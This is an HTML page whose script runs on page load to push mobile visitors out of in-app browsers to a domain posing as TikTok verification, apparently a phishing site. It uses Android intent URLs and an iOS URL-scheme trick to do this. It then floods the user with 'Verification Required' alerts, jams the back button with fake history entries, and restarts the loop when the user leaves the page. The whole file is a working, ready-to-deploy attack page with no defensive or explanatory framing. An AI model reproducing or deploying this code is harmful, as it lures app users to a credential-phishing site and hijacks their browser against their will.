<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    
    // Exact time the page loaded
    const startTime = Date.now();
    // STOP alerts exactly 5 seconds after load
    const limit = 5000; 

    function forceSystemOpen() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
        } else if (isIOS) {
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            // Secondary trigger for iOS
            const a = document.createElement('a');
            a.href = destination;
            a.rel = "noreferrer";
            a.click();
        }
    }

    function rampage() {
        // FAIL-SAFE: If current time is 5s past start, STOP everything.
        if (Date.now() - startTime > limit) {
            console.log("SAFE MODE ACTIVE");
            return;
        }

        // 1. Attempt breakout
        forceSystemOpen();

        // 2. Show the alert
        alert("Verification Required\n\nClick OK to open your browser.");
        
        // 3. Attempt breakout again immediately after OK
        forceSystemOpen();

        // 4. Recursive call
        setTimeout(rampage, 1);
    }

    window.onload = () => {
        // Build history to jam back button
        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
        
        // Start the engine
        rampage();
    };

    // If they hit X (blur), re-trigger the rampage logic
    window.onblur = () => {
        rampage();
    };
</script>

</body>
</html>
